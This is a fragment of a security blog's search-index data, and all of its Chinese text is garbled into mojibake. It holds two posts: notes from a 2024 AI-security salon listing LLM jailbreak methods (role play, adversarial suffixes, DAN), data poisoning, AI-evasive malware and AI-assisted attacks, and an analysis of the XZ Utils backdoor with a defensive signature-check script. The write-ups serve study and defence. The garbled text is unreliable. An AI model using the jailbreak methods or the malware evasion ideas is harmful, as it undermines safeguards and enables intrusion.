äº†å¯è§£é‡Šæ€§ï¼Œå…¶å¯è§£é‡Šæ€§æ˜¯åŸºäºçŸ¥è¯†åº“æ£€ç´¢çš„ã€‚è€ŒçŸ¥è¯†åº“éœ€è¦äººä¸ºæ„å»ºå’Œç»´æŠ¤ã€‚ çŸ¥è¯†å›¾è°±æ„å»ºæµç¨‹ï¼š è®¾è®¡å®ä½“æ¨¡å¼ ç°æœ‰å®‰å…¨é¢†åŸŸæœ¬ä½“å½’ä¸€åŒ–å¤„ç† éšå½¢çŸ¥è¯†æŒ–æ˜ã€å€¼å®ˆä¼˜åŒ– æ„å»ºçŸ¥è¯†è´¨é‡è¯„ä¼°ä½“ç³» ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:3:2","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"4ã€å¤§æ¨¡å‹å®‰å…¨é˜²å¾¡ä¸AIç½‘ç»œå®‰å…¨é©æ–°ç ”ç©¶ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:4:0","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"è®®é¢˜ç®€ä»‹ ä¹‹åç”±åˆ˜å…‰æ˜ï¼ˆvivoå¤§æ¨¡å‹å®‰å…¨ä¸“å®¶ï¼‰å¸¦æ¥å¤§æ¨¡å‹å®‰å…¨é˜²å¾¡ä¸AIç½‘ç»œå®‰å…¨é©æ–°ç ”ç©¶ æœ¬è®®é¢˜å›´ç»•å¤§æ¨¡å‹çš„å®‰å…¨å…¨å‘¨æœŸé˜²æŠ¤å±•å¼€è®¨è®ºï¼Œåˆ†äº«æ”»é˜²å®è·µï¼Œæ¢è®¨é¢†å…ˆçš„ç ”ç©¶æ–¹æ³•å’Œç³»ç»ŸåŒ–è¯„ä¼°æ–¹æ¡ˆï¼Œä»¥åŠAIæŠ€æœ¯åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸçš„é©æ–°åº”ç”¨ã€‚ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:4:1","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"LLMå¸¸è§çš„æ”»å‡»æ¨¡å¼ ç”Ÿå‘½å‘¨æœŸä¸­å¯¹LLMï¼ˆLarge Language Modelï¼Œå¤§è¯­è¨€æ¨¡å‹ï¼‰çš„å®‰å…¨å¨èƒï¼š è®¾è®¡é˜¶æ®µï¼š æ¨¡å‹éƒ¨ç½²çš„æ”»å‡»ã€è®­ç»ƒæ¡†æ¶çš„æ”»å‡»ã€è®­ç»ƒç¯å¢ƒçš„æ”»å‡»ã€ä¾›åº”é“¾çš„æ”»å‡» è®­ç»ƒé˜¶æ®µï¼š è®­ç»ƒæ•°æ®å®‰å…¨ã€ä¼¦ç†ä¸é“å¾·ã€è®­ç»ƒæŠ•æ¯’ã€ç®—åŠ›æ¶ˆè€—æ”»å‡» è¿è¡Œé˜¶æ®µï¼š æç¤ºè¶Šç‹±ã€æŒ‡ä»¤æ”»å‡»ã€è§’è‰²æ‰®æ¼”ã€æ¨¡å‹å¹»è§‰ æ•°æ®æ”¶é›†é˜¶æ®µï¼š æ•°æ®æŠ•æ¯’ã€æ•°æ®åé—¨ã€ä¼¦ç†ä¸é“å¾·ã€ç‰ˆæƒä¾µçŠ¯ å¦‚å›¾ï¼š LLMçš„ä¸¤ç±»æ”»å‡»æ¨¡å¼ï¼šæç¤ºè¯æ¨¡å¼ï¼ˆPrompt-Levelï¼‰ã€ä¼šè¯æ¨¡å¼ï¼ˆToken-Levelï¼‰ å·¦è¾¹æ˜¯æç¤ºè¯æ¨¡å¼ï¼Œåˆ†åˆ«é‡‡ç”¨äº†è§’è‰²æ‰®æ¼”ï¼ˆRole Playï¼‰æ”»å‡»ï¼Œè®©æ¨¡å‹æ‰®æ¼”ä¸€ä¸ªé‚ªæ¶ä¸”ä¸å®ˆè§„çŸ©çš„ç–¯å­ï¼›æ¶æ„è¯±å¯¼ï¼ˆMaliciously Inducingï¼‰æ”»å‡»ï¼Œè¯±å¯¼æ¨¡å‹å¤„äºè™šæ‹Ÿä¸–ç•Œéœ€è¦å®Œæˆä»»åŠ¡ã€‚ å³è¾¹æ˜¯ä¼šè¯æ¨¡å¼ï¼Œå¯¹æŠ—æ€§åç¼€ï¼ˆAdversarial suffixesï¼‰æ”»å‡»ï¼Œæ·»åŠ ä¸€äº›å¯¹æŠ—æ€§å‰åç¼€ï¼Œç»•è¿‡æ¨¡å‹è§„åˆ™æ£€æµ‹ã€‚ DANï¼ˆDo anything nowï¼‰æ”»å‡» ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:4:2","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"5ã€AIåŒåˆƒå‰‘ï¼šå®è·µè§’åº¦è°ˆAIæ¨¡å‹å¼±ç‚¹ä¸ç½‘ç»œå®‰å…¨åº”ç”¨ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:5:0","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"è®®é¢˜ç®€ä»‹ nEINEIï¼ˆæŸå¤§å‚AIå®‰å…¨ä¸“å®¶ã€èµ„æ·±å®‰å…¨ç ”ç©¶å‘˜ï¼‰å¸¦æ¥ AIåŒåˆƒå‰‘:å®è·µè§’åº¦è°ˆAIæ¨¡å‹å¼±ç‚¹ä¸ç½‘ç»œå®‰å…¨åº”ç”¨ éšç€æ–°æŠ€æœ¯çš„æ¶Œç°ï¼Œå¿…ç„¶ä¼´éšç€æ–°çš„å®‰å…¨æŒ‘æˆ˜ï¼Œè¿™æ˜¯æŠ€æœ¯å‘å±•ä¸­ä¸å¯é¿å…çš„æ•ˆåº”ã€‚å…¶ä¸­ä¹‹ä¸€ä¾¿æ˜¯å†…åœ¨çš„å®‰å…¨éšæ‚£ï¼Œå³æ–°æŠ€æœ¯æœ¬èº«çš„è„†å¼±æ€§å¯èƒ½å¯¼è‡´ç³»ç»Ÿçš„ä¸ç¨³å®šæ€§å’Œå®‰å…¨é—®é¢˜ã€‚ æœ¬è®®é¢˜æ·±å…¥æ¢è®¨AIåœ¨éƒ¨ç½²å’Œä½¿ç”¨è¿‡ç¨‹ä¸­å­˜åœ¨çš„å®‰å…¨å¼±ç‚¹é—®é¢˜ï¼ŒåŒæ—¶ä»‹ç»AIæŠ€æœ¯åœ¨å®‰å…¨æ£€æµ‹å’Œé˜²æŠ¤æ–¹é¢çš„å®è·µåº”ç”¨æ€è·¯ã€‚ è¯¥è®®é¢˜è®©æˆ‘å°è±¡æ·±åˆ»çš„ä¸€ç‚¹æ˜¯ï¼Œåˆ©ç”¨AIå¯¹æŠ—AIï¼Œå…¶ä¸­æ„æƒ³äº†ä¸€ç§åè°ƒè¯•æ€è·¯ï¼š åœ¨æ¶æ„è½¯ä»¶ä¸­å¢åŠ ä¸€ä¸ªæ¨¡å‹ï¼Œå½“ç›‘æµ‹åˆ°è°ƒè¯•ç¯å¢ƒæ—¶ï¼Œä¸ç”Ÿæˆå’Œæ‰§è¡Œæ¶æ„ä»£ç ï¼›å½“æ£€æµ‹åˆ°æ˜¯é¢„æœŸçš„å—å®³è€…ç›®æ ‡ç¯å¢ƒï¼Œåˆ™ç”Ÿäº§å¹¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚ è¿™å°±æ˜¯åˆ©ç”¨äº†AI è¿è¡Œé€»è¾‘çš„ä¸å¯é¢„æµ‹æ€§ï¼Œå¾ˆéš¾æ‰¾åˆ°åƒä¹‹å‰çš„æ™®é€šæ¶æ„è½¯ä»¶çš„æ¡ä»¶åˆ¤æ–­è¯­å¥ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:5:1","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"èƒŒæ™¯ AIèµ‹èƒ½ç½‘ç»œå®‰å…¨å…·æœ‰è¿«åˆ‡çš„ç°å®æ„ä¹‰ï¼Œæˆ‘ä»¬å¯ä»¥æ¢ç´¢ç‰¹å®šå®‰å…¨å¸¸è§å¼•å…¥é«˜ç®—åŠ›æˆ–ç‰¹å®šç®—æ³•ï¼Œäº§ç”Ÿå‰åè´¨å˜çš„ä¸šåŠ¡åœºæ™¯ã€‚ æŠ‰æ‹©ï¼šå å°½å…ˆæœºï¼Œåœ¨å°šæœªå½¢æˆAIå¯¹æŠ—AIçš„æ—¶ä»£å…·æœ‰ä¸»åŠ¨ä¼˜åŠ¿ã€‚ åœ¨äººå·¥æ™ºèƒ½çš„å…¨ç”Ÿå‘½å‘¨æœŸï¼Œå„ä¸ªé˜¶æ®µéƒ½æœ‰ç›¸åº”çš„é£é™©ã€‚ å¯¹äºæ¨¡å‹æ–‡ä»¶ï¼Œå®‰å…¨æ”»é˜²çš„è½ç‚¹åœ¨äºï¼ˆå†’å·åé¢ä¸ºç¬”è€…è‡ªè¡Œè¡¥å……ï¼Œå¯èƒ½æœ‰è¯¯ï¼‰ï¼š æ¨¡å‹æ–‡ä»¶çš„åŠ å¯†å¼ºåº¦ï¼šåŠ å¯†å¼ºåº¦ä¸è¶³å¯èƒ½å¯¼è‡´æ¨¡å‹æ–‡ä»¶æ³„éœ²ï¼Œä»è€Œå¯èƒ½å¯¼è‡´è¢«ç¯¡æ”¹ã€åŠ«æŒã€äºŒæ¬¡æ‰“åŒ…ç­‰é—®é¢˜ï¼› æ¨¡å‹æ–‡ä»¶åŒ…å«çš„å‚æ•°ä¿¡æ¯ é’ˆå¯¹æ¨¡å‹æ–‡ä»¶çš„æ”»å‡»æ–¹å¼ï¼šå¯ç¯¡æ”¹æ¨¡å‹æ–‡ä»¶ï¼Œé¢„ç•™åé—¨ç­‰ï¼› æ¨¡å‹ä¿¡æ¯çš„é€†å‘è¿˜åŸï¼šæ¨¡å‹åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ä¼šâ€œè®°å¿†â€è®­ç»ƒæ•°æ®ã€æ•°æ®å±æ€§ã€ç‰¹å¾ç­‰ï¼Œå¯¹æ¨¡å‹è¿›è¡Œé€†å‘æ¨å¯¼è®­ç»ƒå¯å¯¼è‡´è®­ç»ƒæ•°æ®æ³„éœ²ï¼› â€¦ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:5:2","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"å±•æœ› AIçš„ä¸€äº›åœ¨æ”»å‡»é¢†åŸŸçš„åº”ç”¨ï¼š ç¤¾ä¼šå·¥ç¨‹å­¦ï¼šOSINTæœé›†ã€AIç”Ÿæˆé±¼å‰é‚®ä»¶ã€æ”»å‡»ç›®æ ‡é€‰æ‹©ã€èŠå¤©æœºå™¨äººâ€¦ è‡ªåŠ¨åŒ–ï¼šAIè‡ªé€‚åº”æœ¨é©¬ï¼ˆfirstorderï¼‰ã€æ”»å‡»è·¯å¾„æ¨¡æ‹Ÿï¼ˆcaldera AI-fuzzingï¼‰â€¦ ä¿¡æ¯çªƒå–ï¼šYahoo NSFWç¥ç»ç½‘ç»œæ£€æµ‹æ•æ„Ÿæ•°æ®ã€æ•°æ®ä¼ è¾“-AIä¼ªè£…åŠ å¯†ã€MLä¾§ä¿¡é“è·å–æ•²é”®å¯†ç â€¦ éšåŒ¿ï¼šBypass NIDSã€Bypass EDRã€Bypass Email Filterâ€¦ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:5:3","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"6ã€æµ…è°ˆAIæ—¶ä»£ä¼ä¸šæ•°æ®åˆè§„è§†è§’ä¸‹çš„ç½‘ç»œå®‰å…¨ æœ€åæ˜¯è·¯å»ºæ˜ï¼ˆæŸæ³•é™¢åŸæ³•å®˜ï¼ŒåŒ—äº¬æ’éƒ½å¾‹å¸ˆäº‹åŠ¡æ‰€é«˜çº§é¡¾é—®ï¼‰ï¼Œæµ…è°ˆAIæ—¶ä»£ä¼ä¸šæ•°æ®åˆè§„è§†è§’ä¸‹çš„ç½‘ç»œå®‰å…¨ éšç€AIæ—¶ä»£çš„å…¨é¢åˆ°æ¥ï¼Œç½‘ç»œå®‰å…¨å¯¹å›½å®¶ã€ä¼ä¸šã€ä¸ªäººçš„é‡è¦æ€§æ„ˆå‘æ˜¾ç°ï¼Œåœ¨å›½å®¶ç«‹æ³•çš„æ—¥ç›Šå®Œå–„çš„æƒ…å†µä¸‹ï¼Œæ¯ä¸€ä¸ªä»äº‹ITè¡Œä¸šçš„äººéƒ½éœ€è¦é—®è‡ªå·±ï¼Œç½‘ç»œå®‰å…¨ç«‹æ³•åˆ°åº•çŸ¥å¤šå°‘ã€‚åŒæ—¶ï¼Œç°å®çš„è­¦ç¤ºæ¡ˆä¾‹åˆèƒ½ç»™æˆ‘ä»¬å“ªäº›å¯å‘ã€‚ åˆ†äº«äº†ä¸€äº›è¿èƒŒæ•°æ®åˆè§„çš„æ³•å¾‹æ¡ˆä¾‹ã€‚ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:6:0","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"å…¶ä»– è¿™é‡Œæˆ‘æƒ³æ¨èä¸€æœ¬ä¹¦ï¼Œè…¾è®¯å®‰å…¨æœ±é›€å®éªŒå®¤çš„ã€ŠAIå®‰å…¨ï¼šæŠ€æœ¯ä¸å®æˆ˜ã€‹ã€‚ è¿™æœ¬ä¹¦ä»‹ç»äº†ç°é˜¶æ®µå¸¸è§çš„AIå®‰å…¨çŸ¥è¯†ï¼Œæ¯”å¦‚ï¼šå¯¹æŠ—æ ·æœ¬æ”»å‡»ã€æ•°æ®æŠ•æ¯’æ”»å‡»ã€æ¨¡å‹åé—¨æ”»å‡»ã€é¢„è®­ç»ƒæ¨¡å‹å®‰å…¨ã€AIæ•°æ®éšç§çªƒå–ã€AIåº”ç”¨å¤±æ§é£é™©ã€‚ ä¸Šè¿°çŸ¥è¯†ç‚¹ï¼Œåœ¨æœ¬æ¬¡åŒ—äº¬ç«™AIè®®é¢˜åˆ†äº«è¿‡ç¨‹ä¸­ï¼Œéƒ½æœ‰æåŠï¼Œå€¼å¾—ä¸€è¯»ã€‚ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:7:0","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"XZ UtilÑ• å·¥å…·åº“ æ¶æ„åé—¨æ¤å…¥æ¼æ´ (CVE-2024-3094) ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:1:0","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"æ¼æ´ä»‹ç» XZæ˜¯ç±»Unixæ“ä½œç³»ç»Ÿä¸Šçš„ä¸€ç§é«˜å‹ç¼©æ¯”çš„æ— æŸæ•°æ®å‹ç¼©æ ¼å¼ï¼Œç”± Tukaani é¡¹ç›®å¼€å‘ï¼Œé€šå¸¸ä¸gzibzip2 ç­‰å…¶ä»–å¸¸è§æ•°æ®å‹ç¼©æ ¼å¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒå¸®åŠ©å°†å¤§æ–‡ä»¶æ ¼å¼å‹ç¼©ï¼ˆç„¶åè§£å‹ç¼©ï¼‰ ä¸ºæ›´å° æ›´æ˜“ç®¡ç†çš„å¤§å°ï¼Œ ä»¥ä¾¿é€šè¿‡æ–‡ä»¶ä¼ è¾“è¿›è¡Œå…±äº«ã€‚ XZ Utilsæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼ŒåŒ…å«XZæ–‡ä»¶å’Œliblzmaçš„å‹ç¼©å’Œè§£å‹ç¼©åŠŸèƒ½ã€‚ liblzma æ˜¯ä¸€ä¸ªç”¨äºå¤„ç† XZ å‹ç¼©æ ¼å¼çš„å¼€æºè½¯ä»¶åº“ï¼Œæ˜¯ä¸€ç§ç”¨äºæ•°æ®å‹ç¼©çš„ç±»ä¼¼zlibçš„APIï¼Œå¹¶ä¸”è¿˜æ”¯æŒæ—§ç‰ˆ .lzma æ ¼å¼ã€‚ 3æœˆ29æ—¥ï¼Œæœ‰å¼€å‘äººå‘˜åœ¨å®‰å…¨é‚®ä»¶åˆ—è¡¨ä¸Šå‘å¸–ç§°ï¼Œä»–åœ¨è°ƒæŸ¥SSHæ€§èƒ½é—®é¢˜æ—¶å‘ç°äº†æ¶‰åŠXZåŒ…ä¸­çš„ä¾›åº”é“¾æ”»å‡»ï¼Œè¿›ä¸€æ­¥æº¯æºå‘ç°SSHä½¿ç”¨çš„ä¸Šæ¸¸liblzmaåº“è¢«æ¤å…¥äº†åé—¨ä»£ç ï¼Œæ¶æ„ä»£ç å¯èƒ½å…è®¸æ”»å‡»è€…é€šè¿‡åé—¨ç‰ˆæœ¬çš„SSHéæˆæƒè·å–ç³»ç»Ÿçš„è®¿é—®æƒé™ã€‚æ¶æ„ä»£ç ä¿®æ”¹äº†liblzmaä»£ç ä¸­çš„å‡½æ•°ï¼Œè¯¥ä»£ç æ˜¯XZ Utilsè½¯ä»¶åŒ…çš„ä¸€éƒ¨åˆ†ï¼Œé“¾æ¥åˆ° XZ åº“çš„ä»»ä½•è½¯ä»¶éƒ½å¯ä»¥ä½¿ç”¨æ­¤ä¿®æ”¹åçš„ä»£ç ï¼Œå¹¶å…è®¸æ‹¦æˆªå’Œä¿®æ”¹ä¸è¯¥åº“ä¸€èµ·ä½¿ç”¨çš„æ•°æ®ã€‚ ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:2:0","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"æ¼æ´ä¿¡æ¯ â€”â€” â€”â€” â€”â€” â€”â€” æ¼æ´åç§° XZ UtilÑ•å·¥å…·åº“æ¶æ„åé—¨æ¤å…¥æ¼æ´ å…¬å¼€æ—¶é—´ 2024-03-29 CVEç¼–å· CVE-2024-3094 æ¼æ´è¯„çº§ é«˜å± äº‹ä»¶ç±»å‹ ä¾›åº”é“¾æ”»å‡»ã€ åé—¨ æŠ€æœ¯ç±»å‹ å†…åµŒæ¶æ„ä»£ç  å‚å•† å¼€æºé¡¹ç›® Tukaani Project äº§å“ xz å¨èƒçŠ¶æ€ POC/EXPå·²å…¬å¼€ï¼Œåœ¨é‡åˆ©ç”¨å·²å‘ç°ï¼ŒæŠ€æœ¯ç»†èŠ‚éƒ¨åˆ†å…¬å¼€ å½±å“ç‰ˆæœ¬ xz == 5.6.0 ã€xz == 5.6.1 ã€liblzma== 5.6.0 ã€liblzma== 5.6.1 ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:2:1","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"å—å½±å“ç»„ä»¶å’Œç³»ç»Ÿ xz å’Œ liblzma 5.6.0~5.6.1 ç‰ˆæœ¬ï¼Œå¯èƒ½åŒ…æ‹¬çš„å‘è¡Œç‰ˆ / åŒ…ç®¡ç†ç³»ç»Ÿæœ‰ï¼š Fedora 41 / Fedora Rawhide Debian Sid éç¨³å®šçš„æµ‹è¯•ç‰ˆ 5.5.1alpha-0.1 åˆ° 5.6.1-1 Alpine Edge x64 æ¶æ„çš„ homebrew æ»šåŠ¨æ›´æ–°çš„å‘è¡Œç‰ˆï¼ŒåŒ…æ‹¬ Arch Linux / OpenSUSE Tumbleweed è¯¦æƒ…å¯å‚è€ƒï¼š https://repology.org/project/xz/versions ä»¥ä¸‹ä¸ºæ­£åœ¨æ›´æ–°çš„æ“ä½œç³»ç»Ÿå’Œå‘è¡Œç‰ˆåˆ—è¡¨ï¼Œ å®ƒä»¬å·²ç»æŠ¥å‘Šæ˜¯å¦å—åˆ°è¿™ä¸ªæ¼æ´çš„å½±å“ã€‚ æŸ¥çœ‹å—å½±å“çš„å¼€æºæ“ä½œç³»ç»Ÿå¯å‚è€ƒï¼š https://repology.org/project/xz/versions å¦‚æœæ‚¨çš„ç³»ç»Ÿä½¿ç”¨ systemd å¯åŠ¨ OpenSSH æœåŠ¡å™¨ï¼Œæ‚¨çš„ SSH è®¤è¯è¿‡ç¨‹å¯èƒ½è¢«æ”»å‡»ã€‚ é x64 (amd64) æ¶æ„çš„ç³»ç»Ÿä¸å—å½±å“ã€‚ ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:2:2","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"æ¼æ´æ’æŸ¥ é€šè¿‡å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿæœ¬åœ°æ˜¯å¦å®‰è£…äº†å—å½±å“çš„ XZï¼š $ xz --version xz (XZ Utils) 5.6.1 liblzma 5.6.1 è‡ªæŸ¥è„šæœ¬å¦‚ä¸‹ï¼š åœ¨ç³»ç»Ÿä¸­æ‰§è¡Œè„šæœ¬ #! /bin/bash set -eu # find path to liblzma used by sshd path=\"$(ldd $(which sshd) | grep liblzma | grep -o '/[^ ]*')\" # does it even exist? if [ \"$path\" == \"\" ] then echo probably not vulnerable exit fi # check for function signature if hexdump -ve '1/1 \"%.2x\"' \"$path\" | grep -q f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410 then echo probably vulnerable else echo probably not vulnerable fi ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:2:3","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"ç¼“è§£æªæ–½ ç›®å‰å®˜æ–¹å°šæ— æœ€æ–°ç‰ˆæœ¬ï¼Œ éœ€å¯¹è½¯ä»¶ç‰ˆæœ¬è¿›è¡Œé™çº§ 5.4.Xï¼Œ è¯·å…³æ³¨å®˜æ–¹æ–°ç‰ˆæœ¬å‘å¸ƒå¹¶åŠæ—¶æ›´æ–°ã€‚ Fedora Linux 40 ç”¨æˆ·éœ€ xz å›é€€åˆ° 5.4.x ç‰ˆæœ¬å¯å‚è€ƒï¼š https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users https://bodhi.fedoraproject.org/updates/FEDORA-2024-d02c7bb266 ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:2:4","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"èƒŒåæ•…äº‹ æ•…äº‹å¤§æ¦‚æ˜¯ï¼š OpenSSHä¾èµ–ä¸€ä¸ªåä¸ºliblzma(xz)çš„å°ä¼—å¼€æºå‹ç¼©åº“ï¼Œæ”»å‡»è€…è™šæ„äº†ä¸€ä¸ªåä¸º\"Jia Tan\"çš„å¼€å‘è€…èº«ä»½ï¼Œä»2021å¹´10æœˆå¼€å§‹ä¸ºxzé¡¹ç›®ç§¯æåšå¼€å‘ç»´æŠ¤è´¡çŒ®ï¼Œé€æ¸è·å¾—ä¿¡ä»»ã€‚ æœ€ç»ˆæ¥ç®¡äº†ç»´æŠ¤å·¥ä½œåï¼Œåœ¨æ„å»ºè„šæœ¬ä¸­é€æ­¥åŠ å…¥ä¸€ä¸ªå¤æ‚éšè”½å¹¶å¤æ‚æ··æ·†çš„åé—¨ï¼Œè€Œä¸”æ˜¯å‡ ä¸ªæœˆå†…æ…¢æ…¢çš„æ·»åŠ æ‰€æœ‰ç»„ä»¶ï¼Œç»„åˆæˆäº†å®Œæ•´çš„åé—¨ï¼Œæ¥ç€è¿˜è”ç³»Linuxå‘è¡Œç‰ˆç»´æŠ¤äººå‘˜ï¼Œè¯•å›¾è®©å¸¦åé—¨çš„xzåº“è¢«æ‰“åŒ…åˆ†å‘ç»™æ‰€æœ‰ç”¨æˆ·ï¼Œç›´åˆ°å¾®è½¯å‘˜å·¥Andres Freundå› è°ƒæŸ¥SSHå»¶è¿Ÿé—®é¢˜å‘ç°äº†æ­¤äº‹ã€‚ å‘ç°ä¹Ÿå¾ˆå·§åˆï¼ŒAndres Freundåœ¨åˆ†æä¸€å°è¿è¡ŒDebian Sidçš„Linuxè®¾å¤‡SSHç™»å½•é€Ÿåº¦è¿‡æ…¢é—®é¢˜æ—¶ï¼ˆæœ‰500æ¯«ç§’çš„å»¶è¿Ÿå’Œå¤§é‡çš„CPUæ¶ˆè€—é—®é¢˜ï¼Œè€Œä¸”ä»–åœ¨ä½¿ç”¨â€œValgrindâ€å·¥å…·è¿›è¡Œåˆ†æå’Œå†…å­˜è°ƒè¯•æ—¶é‡åˆ°äº†è®¸å¤šæŠ¥é”™ï¼Œä¹Ÿä¿ƒä½¿ä»–æœ‰è¿›ä¸€æ­¥è°ƒæŸ¥çš„æƒ³æ³•ï¼‰ï¼Œæœ€ç»ˆå‘ç°äº†è¯¥åé—¨ã€‚è€Œä¸”RCEä¹Ÿéå¸¸å·§å¦™ï¼Œå°†æœ‰æ•ˆè´Ÿè½½éšè—åˆ°å°†è¦å‘é€åˆ° SSH çš„ä¸“é—¨åˆ¶ä½œçš„å¯†é’¥é‡Œã€‚ ç›®å‰è¿¹è±¡è¡¨æ˜ï¼Œåé—¨ä½œè€…æœ‰é€‰æ‹©æ€§çš„é’ˆå¯¹ linux å‘è¡Œç‰ˆä¸‹æ‰‹ã€‚ä½†è¿™ä¸ª liblzma å¯ä¸åªLinuxä¸Šç”¨ã€‚æ¯”å¦‚ç›®å‰æµè¡Œçš„iOSè¶Šç‹±ç¯å¢ƒï¼Œå¤§éƒ¨åˆ† tweak åŒ…è¿˜æ˜¯ä»¥ .deb æ ¼å¼å‘è¡Œï¼Œæ¯”è¾ƒæ–°çš„ç‰ˆæœ¬å°±ç”¨åˆ°äº† lzma ä½œä¸ºå‹ç¼©ã€‚ é™¤æ­¤ä¹‹å¤–è¿‘æœŸæœ‰åœ¨ macOS ä¸Šä½¿ç”¨ brew å®‰è£…è¿‡ xz è¿™ä¸ªåŒ…åº”è¯¥ä¹Ÿå—å½±å“ï¼Œå¾ˆå¤š brew åŒ…éƒ½ä¾èµ–äº† xzï¼Œä½ å¯èƒ½ä¸çŸ¥ä¸è§‰å°±è£…ä¸Šäº†ï¼Œè¿˜å¥½æš‚æ—¶ä¸èƒ½è¯æ˜è¿™ä¸ªåé—¨ä¼šæ„ŸæŸ“ macOSã€‚ Andres çš„ç”µå­é‚®ä»¶é‡Œæœ‰å¯¹æ•´ä¸ªæ•…äº‹ç²¾å½©æè¿°ã€‚è¿˜æœ‰æœ‰è¶£çš„éƒ¨åˆ†æ˜¯å¸¦æœ‰æ··æ·†åé—¨çš„äºŒè¿›åˆ¶æ–‡ä»¶æœ¬èº«ï¼Œé‚®ä»¶åŸæ–‡åœ¨è¿™ã€‚ 